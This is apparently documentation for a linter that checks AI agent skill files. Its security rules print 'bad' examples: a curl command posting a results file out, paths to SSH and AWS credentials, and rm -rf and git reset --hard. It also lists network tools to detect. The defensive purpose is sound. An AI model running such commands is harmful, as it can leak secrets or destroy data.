# Linting Skills with `skillkit lint`

## What It Does

`skillkit lint` scans your SKILL.md files and checks them for common mistakes, security risks, and best-practice violations. It reads the YAML frontmatter (the `---` block at the top) and the Markdown body, then runs 15 rules against each file. You get a clear report telling you exactly what to fix and why. Think of it as a spell-checker for your agent skills.

## Quick Start

```bash
# Lint all SKILL.md files in the current directory (and subdirectories)
skillkit lint .
```

That's it. The command recursively finds every file named `SKILL.md` under the path you give it (skipping `node_modules`, `.git`, `dist`, `coverage`, and `.next`), runs all rules, and prints a report.

Other common invocations:

```bash
# Lint a specific skills folder
skillkit lint .claude/skills

# Lint your global skills
skillkit lint ~/.claude/skills

# Lint a single skill's parent directory
skillkit lint ./examples/review
```

---

## What It Checks

The linter has 15 rules organized into four categories.

### Spec Compliance

These rules make sure your SKILL.md follows the Agent Skills specification. Failures here mean the skill may not load correctly.

#### 1. `require-name`

Every skill must have a `name` field in frontmatter. This is how the agent identifies your skill.

**Bad:**

```yaml
---
description: Review code for issues
---
```

**Good:**

```yaml
---
name: review
description: Review code for issues
---
```

#### 2. `require-description`

Every skill must have a `description` of at least 20 characters. Short or missing descriptions make it hard for the agent (and humans) to know what the skill does.

**Bad:**

```yaml
---
name: review
description: Code review
---
```

**Good:**

```yaml
---
name: review
description: Pre-landing code review with severity analysis for any codebase
---
```

#### 3. `valid-frontmatter-fields`

All fields in your frontmatter must be recognized by the spec. Typos and made-up fields get flagged.

Valid fields: `name`, `description`, `user-invocable`, `allowed-tools`, `model`, `context`, `agent`, `hooks`, `argument-hint`, `disable-model-invocation`.

**Bad:**

```yaml
---
name: review
description: Review code for issues in the current branch
author: Jane                # not a spec field
version: 2.0               # not a spec field
---
```

**Good:**

```yaml
---
name: review
description: Review code for issues in the current branch
user-invocable: true
---
```

#### 4. `valid-allowed-tools`

If you specify `allowed-tools`, every tool listed must be a recognized name. Catches typos like `bash` instead of `Bash`.

Known tools: `Read`, `Write`, `Edit`, `Bash`, `Glob`, `Grep`, `Agent`, `WebFetch`, `WebSearch`, `NotebookEdit`.

**Bad:**

```yaml
---
name: review
description: Review code for issues in the current branch
allowed-tools: Read, bash, grep, Search
---
```

**Good:**

```yaml
---
name: review
description: Review code for issues in the current branch
allowed-tools: Read, Bash, Grep, WebSearch
---
```

#### 5. `valid-model`

If you specify a `model` field, it should match a recognized model pattern (e.g., `claude-*`, `gpt-*`, `gemini-*`, `o1`, `opus`, `sonnet`, `haiku`).

**Bad:**

```yaml
---
name: review
description: Review code for issues in the current branch
model: super-smart-v3
---
```

**Good:**

```yaml
---
name: review
description: Review code for issues in the current branch
model: claude-sonnet-4-6
---
```

---

### Security

These rules catch patterns that could expose secrets, destroy data, or leak information. They scan your skill's body text (the Markdown instructions below the frontmatter).

#### 6. `no-unrestricted-bash`

If your skill lists `Bash` in `allowed-tools`, the body should contain safety language (words like "never", "do not", "avoid", "forbidden", etc.). Without guardrails, a Bash-enabled skill is a risk.

**Bad:**

```yaml
---
name: deploy
description: Deploy the application to production servers
allowed-tools: Bash, Read
---
```
```markdown
# Deploy

Run `./deploy.sh` to push to production.
```

**Good:**

```yaml
---
name: deploy
description: Deploy the application to production servers
allowed-tools: Bash, Read
---
```
```markdown
# Deploy

Run `./deploy.sh` to push to production.

## Safety

- **Never** run deploy commands without confirming the target environment first
- **Do not** use `--force` flags unless explicitly asked
- **Avoid** running any commands that modify infrastructure outside the deploy script
```

#### 7. `no-sensitive-paths`

Your skill body must not reference paths to secrets like `~/.ssh`, `~/.aws`, `.env`, `/etc/shadow`, `.pem` files, or `credentials.json`.

**Bad:**

```markdown
# Setup

Copy the key from ~/.ssh/id_rsa and add it to the config.
Also check ~/.aws/credentials for the access key.
```

**Good:**

```markdown
# Setup

Use the SSH key configured in your agent's environment.
Read API credentials from the environment variable $AWS_ACCESS_KEY_ID.
```

#### 8. `no-data-exfiltration`

Your skill should not contain commands that send data to external servers, such as `curl`, `wget`, `fetch()` to URLs, `nc` (netcat), or `scp`.

**Bad:**

```markdown
# Report

After analysis, send results:
curl https://example.com/api/report -d @results.json
```

**Good:**

```markdown
# Report

After analysis, write results to `./report.json` in the project root.
The user can review and share them manually.
```

#### 9. `no-destructive-commands`

Flags dangerous commands that could cause irreversible damage: `rm -rf`, `DROP TABLE`, `git push --force`, `git reset --hard`, `git clean -fd`, `TRUNCATE TABLE`, `mkfs`, and `dd`.

**Bad:**

```markdown
# Cleanup

Remove old builds:
rm -rf /dist /build /output

Reset the repo:
git reset --hard origin/main
```

**Good:**

```markdown
# Cleanup

Remove old builds after confirming with the user:
- List files to be deleted first
- Ask for confirmation before deleting
- Use `git stash` instead of `git reset --hard` to preserve changes
```

---

### Best Practices

These rules help you write skills that are clear, portable, and easy to maintain.

#### 10. `description-quality`

The `description` field should start with an action verb, not a vague phrase like "A skill that..." or "This is a...".

**Bad:**

```yaml
---
name: review
description: This skill reviews code for quality issues
---
```

**Good:**

```yaml
---
name: review
description: Review code for quality issues, security flaws, and performance bottlenecks
---
```

#### 11. `body-not-empty`

The Markdown body (everything after the `---` closing the frontmatter) must have at least 50 characters of real content. A skill with no instructions is not useful.

**Bad:**

```yaml
---
name: review
description: Review code for quality issues in any codebase
---
```
```markdown
Review code.
```

**Good:**

```yaml
---
name: review
description: Review code for quality issues in any codebase
---
```
```markdown
# Code Review

Review the current branch's changes against the base branch.

## Steps

1. Run `git diff main...HEAD --stat` to list changed files
2. Read each changed file for full context
3. Check for security issues, logic errors, and missing tests
4. Output findings grouped by severity
```

#### 12. `reasonable-token-estimate`

Skills that exceed roughly 5,000 tokens are getting too long. Large skills eat into the context window and may cause the agent to lose track of instructions. Split long skills into multiple focused skills, or move reference material to separate files.

**Bad:**

A SKILL.md with 300+ lines of detailed instructions, embedded code examples, full API documentation, and lookup tables all in one file.

**Good:**

A focused SKILL.md with clear steps and a pointer to reference material:

```markdown
# Code Review

(concise instructions here)

## Reference

See `./review-checklist.md` for the full checklist.
```

#### 13. `has-argument-hint`

If your skill has `user-invocable: true`, you should include an `argument-hint` field so the user knows what arguments the skill accepts.

**Bad:**

```yaml
---
name: review
description: Review code for quality issues in any codebase
user-invocable: true
---
```

**Good:**

```yaml
---
name: review
description: Review code for quality issues in any codebase
user-invocable: true
argument-hint: "[base-branch]"
---
```

#### 14. `no-hardcoded-paths`

Absolute paths like `/Users/jane/project` or `C:\Users\jane\code` will break on other machines. Use relative paths or environment variables.

**Bad:**

```markdown
# Setup

Read the config from /Users/jane/project/config.yaml
Output results to /home/jane/reports/
```

**Good:**

```markdown
# Setup

Read the config from `./config.yaml` in the project root.
Output results to the `./reports/` directory.
```

#### 15. `consistent-headings`

Markdown headings should not skip levels. Going from `#` (h1) straight to `###` (h3) makes the document harder to read and parse.

**Bad:**

```markdown
# Code Review

### Steps
```

**Good:**

```markdown
# Code Review

## Steps
```

---

## Presets

Presets control which rules run and at what severity level. There are three built-in presets.

### `recommended` (default)

The default when you run `skillkit lint`. All 15 rules are active. Security and spec rules stay at their default severities (mostly errors and warnings). Style-oriented rules (`description-quality`, `has-argument-hint`, `consistent-headings`) report as info (they won't fail your build).

**When to use:** Everyday development. Good balance between catching real problems and not overwhelming you with noise.

### `strict`

Every rule runs at its original default severity with no overrides at all. This means the best-practice and performance rules keep their default warn/info levels rather than being softened. Nothing is turned off.

**When to use:** Before publishing a skill to a shared repo or marketplace. Use this for quality gates in CI.

### `minimal`

Only the 5 spec-compliance rules run (`require-name`, `require-description`, `valid-frontmatter-fields`, `valid-allowed-tools`, `valid-model`). All security, best-practice, and performance rules are turned off.

**When to use:** When you are drafting a new skill and just want to make sure the frontmatter is valid. Not recommended for production use.

### Comparison Table

| Rule | `strict` | `recommended` | `minimal` |
|------|----------|---------------|-----------|
| `require-name` | error | error | error |
| `require-description` | error | error | error |
| `valid-frontmatter-fields` | warn | warn | warn |
| `valid-allowed-tools` | warn | warn | warn |
| `valid-model` | info | info | info |
| `no-unrestricted-bash` | warn | warn | off |
| `no-sensitive-paths` | error | error | off |
| `no-data-exfiltration` | error | error | off |
| `no-destructive-commands` | warn | warn | off |
| `description-quality` | info | info | off |
| `body-not-empty` | warn | warn | off |
| `reasonable-token-estimate` | warn | warn | off |
| `has-argument-hint` | info | info | off |
| `no-hardcoded-paths` | warn | warn | off |
| `consistent-headings` | info | info | off |

---

## Configuration

You can customize the linter by editing `skillkit.config.yaml` in your project root.

### Basic Structure

```yaml
version: 1

lint:
  preset: recommended
  rules:
    # Override individual rules here
```

### Changing the Preset

```yaml
lint:
  preset: strict
```

### Overriding Individual Rule Severities

You can set any rule to `error`, `warn`, `info`, or `off`. Overrides are applied on top of the preset.

```yaml
lint:
  preset: recommended
  rules:
    # Promote a warning to an error (block CI on this)
    no-unrestricted-bash: error

    # Demote an error to a warning (don't block CI)
    require-description: warn

    # Turn off a rule entirely
    has-argument-hint: off

    # Promote info to warn so it shows in summaries
    description-quality: warn
```

### Full Example

```yaml
version: 1

skills:
  paths:
    - .claude/skills
    - .agent/skills

lint:
  preset: recommended
  rules:
    no-unrestricted-bash: error
    no-destructive-commands: error
    consistent-headings: off
    reasonable-token-estimate: off
```

---

## Reading the Output

### Icons

Each finding in the report has an icon showing its severity:

| Icon | Severity | Meaning |
|------|----------|---------|
| (green checkmark) | pass | No issues found in this file |
| (yellow triangle) | `warn` | Something is wrong but not critical. You should fix it. |
| (red X) | `error` | A real problem. The skill may not work correctly or has a security risk. |
| (dim i) | `info` | A suggestion for improvement. Optional to fix. |

### Example Output

```
Found 3 skill(s) in ./examples

examples/review/SKILL.md
  (checkmark) No issues found

examples/deploy/SKILL.md
  (red X) Missing required field: name (require-name)
    -> Add a name field to the YAML frontmatter: name: my-skill
  (yellow triangle) Skill has Bash access but body contains no safety constraints (no-unrestricted-bash)
    -> Add instructions about what commands are forbidden or require confirmation

  1 error(s), 1 warning(s)

examples/cleanup/SKILL.md
  (yellow triangle) Destructive command found: rm -rf (recursive force delete) (no-destructive-commands)
    -> Add confirmation step before destructive operations or use safer alternatives
  (dim i) Description starts with a vague phrase (description-quality)
    -> Start with a verb: "Review code for...", "Generate tests...", "Scaffold a new..."

  1 warning(s), 1 info

FAIL 1 error(s), 2 warning(s) across 3 file(s)
```

### Exit Codes

| Exit Code | Meaning | What to Do |
|-----------|---------|------------|
| `0` | All files passed (zero errors) | Nothing. You're good. Warnings and info do not affect exit code. |
| `1` | At least one error was found | Fix every `error`-level finding before proceeding. |

### What to Do With Each Severity

- **Errors** -- Fix these. They indicate missing required fields, security risks, or spec violations. The command exits with code 1 if any errors exist.
- **Warnings** -- Fix these when you can. They point to problems like unrestricted Bash access, destructive commands, hardcoded paths, or skills that are too long. The command still exits with code 0.
- **Info** -- Nice-to-haves. Better descriptions, argument hints, cleaner heading structure. Address them when polishing a skill for sharing.

---

## Common Fixes

| If You See | Do This |
|-----------|---------|
| `Missing required field: name` | Add `name: my-skill` to your YAML frontmatter. |
| `Missing required field: description` | Add a `description:` line with at least 20 characters. |
| `Description too short (N chars, minimum 20)` | Write a longer description. Explain what the skill does, not just its name. |
| `Unknown frontmatter field: "X"` | Check for typos. Remove the field or use a valid one from the spec. |
| `Unknown tool: "X"` | Tool names are case-sensitive. Use `Bash` not `bash`, `Grep` not `grep`. |
| `Unrecognized model: "X"` | Use a model ID like `claude-sonnet-4-6`, `gpt-4o`, or `gemini-2.0-flash`. |
| `Skill has Bash access but body contains no safety constraints` | Add a section to the body with words like "never", "do not", or "avoid" describing what commands are off-limits. |
| `Skill references sensitive path: X` | Remove the path. Use environment variables or relative paths instead. |
| `Potential data exfiltration: X` | Remove `curl`, `wget`, `scp`, `nc`, or `fetch()` calls to external URLs. If the network access is intentional, document why. |
| `Destructive command found: X` | Add a confirmation step before the command, or suggest a safer alternative (e.g., `git stash` instead of `git reset --hard`). |
| `Description starts with a vague phrase` | Rewrite to start with a verb: "Review...", "Generate...", "Deploy...", "Scaffold...". |
| `Skill body is too short (N chars)` | Add detailed step-by-step instructions, context, and examples. |
| `Skill body is ~N tokens (recommended max: 5000)` | Split the skill into smaller focused skills, or move reference material to separate files. |
| `User-invocable skill has no argument-hint` | Add `argument-hint: "<what arguments to pass>"` to frontmatter. |
| `Hardcoded path found: X` | Replace absolute paths with relative paths (`./config.yaml`) or env vars (`$HOME`). |
| `Heading jumps from hN to hM` | Use sequential heading levels. After `##` use `###`, not `####`. |

---

## CI/CD Integration

Add `skillkit lint` to your GitHub Actions workflow to catch problems before they merge.

### GitHub Actions

```yaml
# .github/workflows/lint-skills.yml
name: Lint Skills

on:
  push:
    paths:
      - '.claude/skills/**'
      - '.agent/skills/**'
  pull_request:
    paths:
      - '.claude/skills/**'
      - '.agent/skills/**'

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install skillkit
        run: npm install -g skillkit

      - name: Lint skills
        run: skillkit lint .
```

Key points:

- The `paths` filter means this job only runs when skill files change, keeping your CI fast.
- `skillkit lint` exits with code 1 if any errors are found, which fails the GitHub Actions step automatically.
- Warnings and info are printed but do not fail the build.

### Stricter CI

To also fail on warnings, override all warning rules to error severity in your `skillkit.config.yaml`:

```yaml
lint:
  preset: strict
  rules:
    no-unrestricted-bash: error
    no-destructive-commands: error
    body-not-empty: error
    reasonable-token-estimate: error
    no-hardcoded-paths: error
    valid-frontmatter-fields: error
    valid-allowed-tools: error
```

---

## Real Example

Here is what it looks like to lint the `examples/` directory in this repo, with annotations explaining each line.

```bash
$ skillkit lint ./examples
```

```
Found 6 skill(s) in ./examples          # Found 6 SKILL.md files recursively

examples/review/SKILL.md                 # First file
  (checkmark) No issues found            # All 15 rules passed -- nothing to do

examples/ship/SKILL.md                   # Second file
  (checkmark) No issues found

examples/tdd/SKILL.md
  (checkmark) No issues found

examples/investigate/SKILL.md
  (checkmark) No issues found

examples/scaffold/SKILL.md
  (dim i) User-invocable skill has no argument-hint (has-argument-hint)
    -> Add argument-hint: "<description of expected arguments>"
                                         # This is info-level, so it's a suggestion
                                         # not a blocking problem

  1 info

examples/improve/SKILL.md
  (checkmark) No issues found

PASS All 6 skill(s) look great!          # Exit code 0 -- no errors found
```

If one of those skills had been missing its `name` field, you would instead see:

```
examples/broken/SKILL.md
  (red X) Missing required field: name (require-name)
    -> Add a name field to the YAML frontmatter: name: my-skill

  1 error(s)

FAIL 1 error(s), 0 warning(s) across 7 file(s)
```

And the command would exit with code 1, failing your CI pipeline.
